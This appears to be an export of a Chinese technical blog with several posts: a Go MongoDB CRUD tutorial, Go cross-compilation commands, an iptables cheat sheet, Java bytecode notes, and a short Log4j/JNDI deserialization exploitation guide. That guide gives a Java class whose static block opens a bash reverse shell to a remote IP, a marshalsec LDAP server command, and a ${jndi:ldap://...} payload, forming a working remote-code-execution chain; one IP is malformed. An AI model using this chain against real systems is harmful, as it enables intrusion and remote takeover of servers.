<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bson.D&#123;&#123;</span><br><span class="line">    &quot;name&quot;,</span><br><span class="line">    bson.D&#123;&#123;</span><br><span class="line">        &quot;$in&quot;,</span><br><span class="line">        bson.A&#123;&quot;张三&quot;, &quot;李四&quot;&#125;,</span><br><span class="line">    &#125;&#125;,</span><br><span class="line">&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>Raw类型家族用于验证字节切片。你还可以使用Lookup()从原始类型检索单个元素。如果你不想要将BSON反序列化成另一种类型的开销，那么这是非常有用的。这个教程我们将只使用D类型。</p>
<p>添加文档<br>创建一个结构体</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">type Student struct &#123;</span><br><span class="line">    Name string</span><br><span class="line">    Age int</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>添加单个文档</p>
<p>使用collection.InsertOne()方法插入一条文档记录：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">func insertOne(s Student) &#123;</span><br><span class="line">    initDB()</span><br><span class="line">    collection := client.Database(&quot;go_db&quot;).Collection(&quot;student&quot;)</span><br><span class="line">    insertResult, err := collection.InsertOne(context.TODO(), s)</span><br><span class="line">    if err != nil &#123;</span><br><span class="line">        log.Fatal(err)</span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Println(&quot;Inserted a single document: &quot;, insertResult.InsertedID)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>测试</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">func main() &#123;</span><br><span class="line">    s := Student&#123;Name: &quot;tom&quot;, Age: 20&#125;</span><br><span class="line">    insertOne(s)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行结果</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Connected to MongoDB!</span><br><span class="line">Inserted a single document:  ObjectID(&quot;61124558682f5c9583330222&quot;)</span><br></pre></td></tr></table></figure>
<p>客户端查看</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mongodb 打开客户端</span><br><span class="line">use go_db</span><br><span class="line">db.student.find()</span><br><span class="line">db.student.remove(&#123;&#125;) // 删除所有</span><br></pre></td></tr></table></figure>
<p>插入多个文档</p>
<p>使用collection.InsertMany()方法插入多条文档记录：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">func insertMore(students []interface&#123;&#125;) &#123;</span><br><span class="line">    //students := []interface&#123;&#125;&#123;s2, s3&#125;</span><br><span class="line">    initDB()</span><br><span class="line">    collection := client.Database(&quot;go_db&quot;).Collection(&quot;student&quot;)</span><br><span class="line">    insertManyResult, err := collection.InsertMany(context.TODO(), students)</span><br><span class="line">    if err != nil &#123;</span><br><span class="line">        log.Fatal(err)</span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Println(&quot;Inserted multiple documents: &quot;, insertManyResult.InsertedIDs)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>测试</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">func main() &#123;</span><br><span class="line">    s := Student&#123;Name: &quot;tom&quot;, Age: 20&#125;</span><br><span class="line">    s1 := Student&#123;Name: &quot;kite&quot;, Age: 21&#125;</span><br><span class="line">    s2 := Student&#123;Name: &quot;rose&quot;, Age: 22&#125;</span><br><span class="line">    students := []interface&#123;&#125;&#123;s, s1, s2&#125;</span><br><span class="line">    insertMore(students)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行结果</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Connected to MongoDB!</span><br><span class="line">Inserted multiple documents:  [ObjectID(&quot;611246c56637c3554426bc92&quot;) ObjectID(&quot;611246c56637c3554426bc93&quot;) ObjectID(&quot;611246c56637c3554426bc94&quot;)]</span><br><span class="line">更多方法请查阅官方文档。</span><br></pre></td></tr></table></figure>

<h4 id="查找文档"><a href="#查找文档" class="headerlink" title="查找文档"></a>查找文档</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">    &quot;context&quot;</span><br><span class="line">    &quot;fmt&quot;</span><br><span class="line">    &quot;log&quot;</span><br><span class="line">    &quot;time&quot;</span><br><span class="line"></span><br><span class="line">    &quot;go.mongodb.org/mongo-driver/bson&quot;</span><br><span class="line">    &quot;go.mongodb.org/mongo-driver/mongo&quot;</span><br><span class="line">    &quot;go.mongodb.org/mongo-driver/mongo/options&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">var client *mongo.Client</span><br><span class="line">func initDB() &#123;</span><br><span class="line">    // 设置客户端连接配置</span><br><span class="line">    clientOptions := options.Client().ApplyURI(&quot;mongodb://localhost:27017&quot;)</span><br><span class="line"></span><br><span class="line">    co := options.Client().ApplyURI(&quot;mongodb://localhost:27017&quot;)</span><br><span class="line">    mongo.Connect(context.TODO(), co)</span><br><span class="line">    // 连接到MongoDB</span><br><span class="line">    var err error</span><br><span class="line">    client, err = mongo.Connect(context.TODO(), clientOptions)</span><br><span class="line">    if err != nil &#123;</span><br><span class="line">        log.Fatal(err)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    client.Ping(context.TODO(), nil)</span><br><span class="line">    // 检查连接</span><br><span class="line">    err = client.Ping(context.TODO(), nil)</span><br><span class="line">    if err != nil &#123;</span><br><span class="line">        log.Fatal(err)</span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Println(&quot;Connected to MongoDB!&quot;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func find() &#123;</span><br><span class="line">    ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)</span><br><span class="line">    defer cancel()</span><br><span class="line">    collection := client.Database(&quot;go_db&quot;).Collection(&quot;student&quot;)</span><br><span class="line">    cur, err := collection.Find(ctx, bson.D&#123;&#125;)</span><br><span class="line">    if err != nil &#123;</span><br><span class="line">        log.Fatal(err)</span><br><span class="line">    &#125;</span><br><span class="line">    defer cur.Close(ctx)</span><br><span class="line">    for cur.Next(ctx) &#123;</span><br><span class="line">        var result bson.D</span><br><span class="line">        err := cur.Decode(&amp;result)</span><br><span class="line">        if err != nil &#123;</span><br><span class="line">            log.Fatal(err)</span><br><span class="line">        &#125;</span><br><span class="line">        fmt.Printf(&quot;result: %v\n&quot;, result)</span><br><span class="line">        fmt.Printf(&quot;result.Map(): %v\n&quot;, result.Map()[&quot;name&quot;])</span><br><span class="line">    &#125;</span><br><span class="line">    if err := cur.Err(); err != nil &#123;</span><br><span class="line">        log.Fatal(err)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">    initDB()</span><br><span class="line">    find()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="更新文档"><a href="#更新文档" class="headerlink" title="更新文档"></a>更新文档</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">    &quot;context&quot;</span><br><span class="line">    &quot;fmt&quot;</span><br><span class="line">    &quot;log&quot;</span><br><span class="line"></span><br><span class="line">    &quot;go.mongodb.org/mongo-driver/bson&quot;</span><br><span class="line">    &quot;go.mongodb.org/mongo-driver/mongo&quot;</span><br><span class="line">    &quot;go.mongodb.org/mongo-driver/mongo/options&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">type Student struct &#123;</span><br><span class="line">    Name string</span><br><span class="line">    Age  int</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var client *mongo.Client</span><br><span class="line"></span><br><span class="line">func initDb() &#123;</span><br><span class="line">    co := options.Client().ApplyURI(&quot;mongodb://localhost:27017&quot;)</span><br><span class="line">    c, err := mongo.Connect(context.TODO(), co)</span><br><span class="line">    if err != nil &#123;</span><br><span class="line">        log.Fatal(err)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    err2 := c.Ping(context.TODO(), nil)</span><br><span class="line">    if err2 != nil &#123;</span><br><span class="line">        log.Fatal(err2)</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        fmt.Println(&quot;连接成功！&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">    client = c</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func update() &#123;</span><br><span class="line">    ctx := context.TODO()</span><br><span class="line">    defer client.Disconnect(ctx)</span><br><span class="line">    c := client.Database(&quot;go_db&quot;).Collection(&quot;Student&quot;)</span><br><span class="line"></span><br><span class="line">    update := bson.D&#123;&#123;&quot;$set&quot;, bson.D&#123;&#123;&quot;Name&quot;, &quot;big tom&quot;&#125;, &#123;&quot;Age&quot;, 22&#125;&#125;&#125;&#125;</span><br><span class="line"></span><br><span class="line">    ur, err := c.UpdateMany(ctx, bson.D&#123;&#123;&quot;name&quot;, &quot;tom&quot;&#125;&#125;, update)</span><br><span class="line">    if err != nil &#123;</span><br><span class="line">        log.Fatal(err)</span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Printf(&quot;ur.ModifiedCount: %v\n&quot;, ur.ModifiedCount)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">    initDb()</span><br><span class="line">    update()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="删除文档"><a href="#删除文档" class="headerlink" title="删除文档"></a>删除文档</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">    &quot;context&quot;</span><br><span class="line">    &quot;fmt&quot;</span><br><span class="line">    &quot;log&quot;</span><br><span class="line"></span><br><span class="line">    &quot;go.mongodb.org/mongo-driver/bson&quot;</span><br><span class="line">    &quot;go.mongodb.org/mongo-driver/mongo&quot;</span><br><span class="line">    &quot;go.mongodb.org/mongo-driver/mongo/options&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">type Student struct &#123;</span><br><span class="line">    Name string</span><br><span class="line">    Age  int</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var client *mongo.Client</span><br><span class="line"></span><br><span class="line">func initDb() &#123;</span><br><span class="line">    co := options.Client().ApplyURI(&quot;mongodb://localhost:27017&quot;)</span><br><span class="line">    c, err := mongo.Connect(context.TODO(), co)</span><br><span class="line">    if err != nil &#123;</span><br><span class="line">        log.Fatal(err)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    err2 := c.Ping(context.TODO(), nil)</span><br><span class="line">    if err2 != nil &#123;</span><br><span class="line">        log.Fatal(err2)</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        fmt.Println(&quot;连接成功！&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">    client = c</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func del() &#123;</span><br><span class="line"></span><br><span class="line">    initDb()</span><br><span class="line">    c := client.Database(&quot;go_db&quot;).Collection(&quot;Student&quot;)</span><br><span class="line">    ctx := context.TODO()</span><br><span class="line"></span><br><span class="line">    dr, err := c.DeleteMany(ctx, bson.D&#123;&#123;&quot;Name&quot;, &quot;big kite&quot;&#125;&#125;)</span><br><span class="line"></span><br><span class="line">    if err != nil &#123;</span><br><span class="line">        log.Fatal(err)</span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Printf(&quot;ur.ModifiedCount: %v\n&quot;, dr.DeletedCount)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">    del()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>golang</tag>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>golang跨平台编译</title>
    <url>/2024/09/10/golang%E8%B7%A8%E5%B9%B3%E5%8F%B0%E7%BC%96%E8%AF%91/</url>
    <content><![CDATA[<h3 id="禁止内联"><a href="#禁止内联" class="headerlink" title="禁止内联"></a>禁止内联</h3><p><code>-gcflags=all=&#39;-l&#39;</code></p>
<h3 id="Mac-下编译-Linux-和-Windows-64位可执行程序"><a href="#Mac-下编译-Linux-和-Windows-64位可执行程序" class="headerlink" title="Mac 下编译 Linux 和 Windows 64位可执行程序"></a>Mac 下编译 Linux 和 Windows 64位可执行程序</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build main.go</span><br><span class="line">CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go</span><br></pre></td></tr></table></figure>

<h3 id="Linux-下编译-Mac-和-Windows-64位可执行程序"><a href="#Linux-下编译-Mac-和-Windows-64位可执行程序" class="headerlink" title="Linux 下编译 Mac 和 Windows 64位可执行程序"></a>Linux 下编译 Mac 和 Windows 64位可执行程序</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CGO_ENABLED=0 GOOS=darwin GOARCH=amd64 go build main.go</span><br><span class="line">CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build main.go</span><br></pre></td></tr></table></figure>


<h3 id="Windows-下编译-Mac-和-Linux-64位可执行程序"><a href="#Windows-下编译-Mac-和-Linux-64位可执行程序" class="headerlink" title="Windows 下编译 Mac 和 Linux 64位可执行程序"></a>Windows 下编译 Mac 和 Linux 64位可执行程序</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SET CGO_ENABLED=0</span><br><span class="line">SET GOOS=darwin</span><br><span class="line">SET GOARCH=amd64</span><br><span class="line">go build main.go</span><br><span class="line">SET CGO_ENABLED=0</span><br><span class="line">SET GOOS=linux</span><br><span class="line">SET GOARCH=amd64</span><br><span class="line">go build main.go</span><br><span class="line">GOOS：目标平台的操作系统（darwin、freebsd、linux、windows）</span><br><span class="line">GOARCH：目标平台的体系架构（386、amd64、arm）</span><br></pre></td></tr></table></figure>
<p>交叉编译不支持 CGO 所以要禁用它<br>上面的命令编译 64 位可执行程序，你当然应该也会使用 386 编译 32 位可执行程序<br>很多博客都提到要先增加对其它平台的支持，但是我跳过那一步，上面所列的命令也都能成功，且得到我想要的结果，可见那一步应该是非必须的，或是我所使用的 Go 版本已默认支持所有平台。</p>
]]></content>
      <tags>
        <tag>golang</tag>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>iptables 配置归纳总结</title>
    <url>/2024/09/10/iptables-%E9%85%8D%E7%BD%AE%E5%BD%92%E7%BA%B3%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h3 id="删除所有配置"><a href="#删除所有配置" class="headerlink" title="删除所有配置"></a>删除所有配置</h3><p>iptables -F</p>
<p>注：如果是远程连接，一定一定不要使用这个命令，所有规则删除后，你将无法连接到你的服务器</p>
<h3 id="更改默认策略："><a href="#更改默认策略：" class="headerlink" title="更改默认策略："></a>更改默认策略：</h3><p>iptables -P INPUT DROP<br>iptables -P OUTPUT DROP<br>iptables -P FORWARD DROP</p>
<h3 id="添加指定IP可以访问本机所有端口"><a href="#添加指定IP可以访问本机所有端口" class="headerlink" title="添加指定IP可以访问本机所有端口"></a>添加指定IP可以访问本机所有端口</h3><p>iptables -A INPUT -s xx.xx.xx.xx(IP) -p all -j ACCEPT</p>
<p>注：-A (Append)代表追回加</p>
<h3 id="添加指定IP可以访问本机的某端口"><a href="#添加指定IP可以访问本机的某端口" class="headerlink" title="添加指定IP可以访问本机的某端口"></a>添加指定IP可以访问本机的某端口</h3><p>iptables -I INPUT -s xx.xx.xx.xx(IP) -p all –dport 8080 -j ACCEPT</p>
<h3 id="查看当前配置的规则"><a href="#查看当前配置的规则" class="headerlink" title="查看当前配置的规则"></a>查看当前配置的规则</h3><p>iptables -nvL</p>
<h3 id="保存当前配置的结果"><a href="#保存当前配置的结果" class="headerlink" title="保存当前配置的结果"></a>保存当前配置的结果</h3><p>iptabels-save 【默认保存结果在 &#x2F;etc&#x2F;sysconfig&#x2F;iptables】</p>
<h3 id="删除规则"><a href="#删除规则" class="headerlink" title="删除规则"></a>删除规则</h3><p>iptables -D INPUT 2</p>
<p>可配合如下语句显示编号使用：</p>
<p>iptables -nvL –line-numbers</p>
<h3 id="从配置中载入规则"><a href="#从配置中载入规则" class="headerlink" title="从配置中载入规则"></a>从配置中载入规则</h3><p>iptables-restore &lt; &#x2F;etc&#x2F;sysconfig&#x2F;iptables</p>
<h3 id="iptabels-和docker的配置"><a href="#iptabels-和docker的配置" class="headerlink" title="iptabels 和docker的配置"></a>iptabels 和docker的配置</h3><p>如果使用了docker 那需要额外添加关于docker的规则。</p>
<p>a.首先查看docker通信的IP地址（ifconfig），假如docker地址是：172.18.0.1</p>
<pre><code>  配置规则：iptables -A INPUT -s 172.18.0.0/24 -j ACCEPT
</code></pre>
<h3 id="重启和停止-一般是这样，我测试的时候报错没有这个命令，可能是我系统有问题"><a href="#重启和停止-一般是这样，我测试的时候报错没有这个命令，可能是我系统有问题" class="headerlink" title="重启和停止-(一般是这样，我测试的时候报错没有这个命令，可能是我系统有问题)"></a>重启和停止-(一般是这样，我测试的时候报错没有这个命令，可能是我系统有问题)</h3><p>service iptables stop<br>service iptables start</p>
<h3 id="追加规则"><a href="#追加规则" class="headerlink" title="追加规则"></a>追加规则</h3><p>iptables -A  命令追加新规则</p>
<h3 id="一些语句样例"><a href="#一些语句样例" class="headerlink" title="一些语句样例"></a>一些语句样例</h3><h4 id="将本地访问本地的4444端口的流量转发到本地的22端口"><a href="#将本地访问本地的4444端口的流量转发到本地的22端口" class="headerlink" title="将本地访问本地的4444端口的流量转发到本地的22端口"></a>将本地访问本地的4444端口的流量转发到本地的22端口</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iptables -t nat -A OUTPUT -p tcp --dport 4444 -j REDIRECT --to-ports 22</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="开放指定的端口"><a href="#开放指定的端口" class="headerlink" title="开放指定的端口"></a>开放指定的端口</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">iptables -A INPUT -s 127.0.0.1 -d 127.0.0.1 -j ACCEPT               #允许本地回环接口(即运行本机访问本机)</span><br><span class="line">iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT    #允许已建立的或相关连的通行</span><br><span class="line">iptables -A OUTPUT -j ACCEPT         #允许所有本机向外的访问</span><br><span class="line">iptables -A INPUT -p tcp --dport 22 -j ACCEPT    #允许访问22端口</span><br><span class="line">iptables -A INPUT -p tcp --dport 80 -j ACCEPT    #允许访问80端口</span><br><span class="line">iptables -A INPUT -p tcp --dport 21 -j ACCEPT    #允许ftp服务的21端口</span><br><span class="line">iptables -A INPUT -p tcp --dport 20 -j ACCEPT    #允许FTP服务的20端口</span><br><span class="line">iptables -A INPUT -j reject       #禁止其他未允许的规则访问</span><br><span class="line">iptables -A FORWARD -j REJECT     #禁止其他未允许的规则访问</span><br></pre></td></tr></table></figure>


<h4 id="屏蔽IP"><a href="#屏蔽IP" class="headerlink" title="屏蔽IP"></a>屏蔽IP</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">iptables -I INPUT -s 123.45.6.7 -j DROP #屏蔽单个IP的命令</span><br><span class="line">iptables -I INPUT -s 123.0.0.0/8 -j DROP #封整个段即从123.0.0.1到123.255.255.254的命令</span><br><span class="line">iptables -I INPUT -s 124.45.0.0/16 -j DROP #封IP段即从123.45.0.1到123.45.255.254的命令</span><br><span class="line">iptables -I INPUT -s 123.45.6.0/24 -j DROP #封IP段即从123.45.6.1到123.45.6.254的命令是</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="命令参数介绍"><a href="#命令参数介绍" class="headerlink" title="命令参数介绍"></a>命令参数介绍</h3><p>(参考:[<a href="https://blog.csdn.net/u011537073/article/details/82685586]">https://blog.csdn.net/u011537073/article/details/82685586]</a> 侵删)</p>
<p><strong>-p 协议（protocol）</strong></p>
<ul>
<li>指定规则的协议，如tcp, udp, icmp等，可以使用all来指定所有协议。</li>
<li>如果不指定-p参数，则默认是all值。这并不明智，请总是明确指定协议名称。</li>
<li>可以使用协议名(如tcp)，或者是协议值（比如6代表tcp）来指定协议。映射关系请查看&#x2F;etc&#x2F;protocols</li>
<li>还可以使用–protocol参数代替-p参数</li>
</ul>
<p><strong>-s 源地址（source）</strong></p>
<p>指定数据包的源地址</p>
<ul>
<li><p>参数可以使IP地址、网络地址、主机名</p>
</li>
<li><p>例如：-s 192.168.1.101指定IP地址</p>
</li>
<li><p>例如：-s 192.168.1.10&#x2F;24指定网络地址</p>
</li>
<li><p>如果不指定-s参数，就代表所有地址</p>
</li>
<li><p>还可以使用–src或者–source</p>
</li>
</ul>
<p><strong>-d 目的地址（destination）</strong></p>
<ul>
<li><p>指定目的地址</p>
</li>
<li><p>参数和-s相同</p>
</li>
<li><p>还可以使用–dst或者–destination</p>
</li>
</ul>
<p><strong>-j 执行目标（jump to target）</strong></p>
<ul>
<li><p>-j代表”jump to target”</p>
</li>
<li><p>-j指定了当与规则(Rule)匹配时如何处理数据包</p>
</li>
<li><p>可能的值是ACCEPT, DROP, QUEUE, RETURN，MASQUERADE</p>
</li>
<li><p>还可以指定其他链（Chain）作为目标</p>
</li>
</ul>
<p>注：MASQUERADE，地址伪装，算是snat中的一种特例，可以实现自动化的snat（详情见上一篇文章）。</p>
<p><strong>-i 输入接口（input interface）</strong></p>
<ul>
<li><p>-i代表输入接口(input interface)</p>
</li>
<li><p>-i指定了要处理来自哪个接口的数据包</p>
</li>
<li><p>这些数据包即将进入INPUT, FORWARD, PREROUTE链</p>
</li>
<li><p>例如：-i eth0指定了要处理经由eth0进入的数据包</p>
</li>
<li><p>如果不指定-i参数，那么将处理进入所有接口的数据包</p>
</li>
<li><p>如果出现! -i eth0，那么将处理所有经由eth0以外的接口进入的数据包</p>
</li>
<li><p>如果出现-i eth+，那么将处理所有经由eth开头的接口进入的数据包</p>
</li>
</ul>
<p>还可以使用–in-interface参数</p>
<p><strong>-o 输出（out interface）</strong></p>
<ul>
<li><p>-o代表”output interface”</p>
</li>
<li><p>-o指定了数据包由哪个接口输出</p>
</li>
<li><p>这些数据包即将进入FORWARD, OUTPUT, POSTROUTING链</p>
</li>
<li><p>如果不指定-o选项，那么系统上的所有接口都可以作为输出接口</p>
</li>
<li><p>如果出现! -o eth0，那么将从eth0以外的接口输出</p>
</li>
<li><p>如果出现-i eth+，那么将仅从eth开头的接口输出</p>
</li>
<li><p>还可以使用–out-interface参数</p>
</li>
</ul>
<p><strong>–sport 源端口（source port）针对 -p tcp 或者 -p udp</strong></p>
<ul>
<li><p>缺省情况下，将匹配所有端口</p>
</li>
<li><p>可以指定端口号或者端口名称，例如”–sport 22″与”–sport ssh”。</p>
</li>
<li><p>&#x2F;etc&#x2F;services文件描述了上述映射关系。</p>
</li>
<li><p>从性能上讲，使用端口号更好</p>
</li>
<li><p>使用冒号可以匹配端口范围，如”–sport 22:100″</p>
</li>
<li><p>还可以使用”–source-port”</p>
</li>
</ul>
<p><strong>–-dport 目的端口（destination port）针对-p tcp 或者 -p udp</strong></p>
<ul>
<li><p>参数和–sport类似</p>
</li>
<li><p>还可以使用”–destination-port”</p>
</li>
</ul>
<p><strong>-–tcp-flags TCP标志 针对-p tcp</strong></p>
<p>可以指定由逗号分隔的多个参数</p>
<ul>
<li><p>有效值可以是：SYN, ACK, FIN, RST, URG, PSH</p>
</li>
<li><p>可以使用ALL或者NONE</p>
</li>
</ul>
<p><strong>-–icmp-type ICMP类型 针对-p icmp</strong></p>
<ul>
<li><p>–icmp-type 0 表示Echo Reply</p>
</li>
<li><p>–icmp-type 8 表示Echo</p>
</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>java反序列化类漏洞利用方法</title>
    <url>/2024/09/10/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%B1%BB%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<h1 id="0x1-编译反弹shell的类"><a href="#0x1-编译反弹shell的类" class="headerlink" title="0x1 编译反弹shell的类"></a>0x1 编译反弹shell的类</h1><p><code>javac poc.java</code></p>
<p>poc.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">poc</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;bash -i &gt;&amp; /dev/tcp/42.113.2223.66/7111 0&gt;&amp;1&quot;</span>&#125;;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">pc</span> <span class="operator">=</span> rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1 id="0x2-使用python开启简单http服务"><a href="#0x2-使用python开启简单http服务" class="headerlink" title="0x2 使用python开启简单http服务"></a>0x2 使用python开启简单http服务</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -m SimpleHTTPServer 7002</span><br></pre></td></tr></table></figure>

<p>python3</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -m http.server 7002`</span><br></pre></td></tr></table></figure>

<h1 id="0x3-使用工具生成jndi服务"><a href="#0x3-使用工具生成jndi服务" class="headerlink" title="0x3 使用工具生成jndi服务"></a>0x3 使用工具生成jndi服务</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar  marshalsec.jndi.LDAPRefServer  http://42.112.232.66:7002/#poc 7777</span><br></pre></td></tr></table></figure>
<h1 id="0x4-最后使用反序列化POC，如log4j-poc"><a href="#0x4-最后使用反序列化POC，如log4j-poc" class="headerlink" title="0x4 最后使用反序列化POC，如log4j poc"></a>0x4 最后使用反序列化POC，如log4j poc</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;jndi:ldap://42.112.232.66:7777&#125;</span><br></pre></td></tr></table></figure>]]></content>
  </entry>
  <entry>
    <title>java 字节码知识</title>
    <url>/2024/09/10/java-%E5%AD%97%E8%8A%82%E7%A0%81%E7%9F%A5%E8%AF%86/</url>
    <content><![CDATA[<h2 id="class文件中的数据类型"><a href="#class文件中的数据类型" class="headerlink" title="class文件中的数据类型"></a>class文件中的数据类型</h2><p>每一个class文件都是由8个字节为单位的字节流构成，class文件格式采用相似于C语言结构体的伪结构来描述，在这种伪结构中只有两种数据类型：无符号数和表。数组</p>
<ul>
<li>无符号数<br>无符号数使用u一、u二、u4和u8分别表示1个字节、2个字节、4个字节和8个字节的无符号数。</li>
<li>表<br>表是由无符号数和其余表做为数据项构成的数据结构。表常常以“_info”后缀表示。</li>
</ul>
<h2 id="class文件结构"><a href="#class文件结构" class="headerlink" title="class文件结构"></a>class文件结构</h2><p>class文件结构以下表：bash</p>
<table>
<thead>
<tr>
<th>类型</th>
<th>名称</th>
<th>数量</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>content1</td>
<td>content2</td>
<td>content3</td>
<td></td>
</tr>
</tbody></table>
<p>u4	magic	1	魔数<br>u2	minor_version	1	副版本号<br>u2	major_version	1	主版本号<br>u2	constant_pool_count	1	常量池计数器<br>cp_info	constant_pool	constant_pool_count-1	常量池<br>u2	access_flags	1	类的访问标志<br>u2	this_class	1	类在常量池中的索引<br>u2	super_class	1	父类在常量池中的索引<br>u2	interfaces_count	1	接口计数器，直接父接口的数量<br>u2	interfaces	interfaces_count	接口表<br>u2	fields_count	1	字段计数器<br>field_info	fields	fields_count	字段表<br>u2	methods_count	1	方法计数器<br>method_info	methods	methods_count	方法表<br>u2	attributes_count	1	属性计数器<br>attribute_info	attributes	attributes_count	属性表<br>下面根据一个HelloWorld程序具体分析下class文件。<br>源码HelloWorld.java数据结构</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package com.xh.hello;</span><br><span class="line"></span><br><span class="line">public class HelloWorld &#123;</span><br><span class="line">    private static int abc = 123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        printABC();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private static void printABC() &#123;</span><br><span class="line">        System.out.println(abc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用javac编译该源文件javac com&#x2F;xh&#x2F;hello&#x2F;HelloWorld.java，获得HelloWorld.class文件。使用十六进制文件查看器查看此文件内容。oracle</p>
